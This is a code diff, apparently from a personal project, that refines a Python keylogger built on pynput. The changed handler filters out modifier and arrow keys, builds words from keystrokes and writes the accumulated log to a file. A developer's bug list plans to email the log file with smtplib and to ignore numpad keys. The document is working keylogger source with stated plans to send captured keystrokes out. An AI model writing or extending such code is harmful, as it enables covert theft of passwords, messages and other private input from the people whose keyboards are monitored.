@@ -92,27 +92,36 @@ def on_press(key):
 	global word
 	global full_log
 
-	# if key presses is space or enter add a space character to list
-	if key == keyboard.Key.space or key == keyboard.Key.enter:
+	# list of keys to ignore when pressed
+	ignored_keys = (
+		keyboard.Key.shift_l, keyboard.Key.shift_r,
+		keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
+		keyboard.Key.alt_l, keyboard.Key.alt_gr,
+		keyboard.Key.caps_lock,
+		keyboard.Key.tab, 
+        keyboard.Key.home, keyboard.Key.insert, keyboard.Key.esc, keyboard.Key.delete, keyboard.Key.end, 
+        keyboard.Key.page_down, keyboard.Key.page_up,
+        keyboard.Key.left, keyboard.Key.right, keyboard.Key.up, keyboard.Key.down,
+        keyboard.Key.cmd,  # Windows key
+        # keyboard.Key.num_lock,
+	)
+
+	if key in ignored_keys:
+		return
+	elif key == keyboard.Key.space or key == keyboard.Key.enter:
 		word += " "
 		full_log += word
 		word = ""
-	elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
-		return
-	elif key == keyboard.Key.alt_l :
-		return
 	elif key == keyboard.Key.backspace:
 		word = word[:-1]
-	elif key == keyboard.Key.esc :
-		return
 	else:
 		char = key.char
 		word += char
-	if len(full_log) >= char_limit: 
+		if len(full_log) >= char_limit:
 			with open(log_file, "a") as file:
 				file.write(full_log + "\n")
-			full_log = "" 
-	
+			full_log = ""
+
 with keyboard.Listener(on_press=on_press) as listener:
 	listener.join()
 
@@ -162,6 +171,6 @@ BUGS FOUND
 1. The program seems not to be refreshing on the timestamp. It just gets taht initial timestamp and whenever it is called again it does not refresh
 2. How to send a *.log file via email using the smtplib module in python
 3. Check line 48 where log_file is declared: if your remove the path, if it affects where the file is created
-4. How to make pynput to ignore all other characters such as alt, ctrl, arrow buttons
+4. Look for ways to ignore the numpad keys if numpad key is off
 5. 
 """
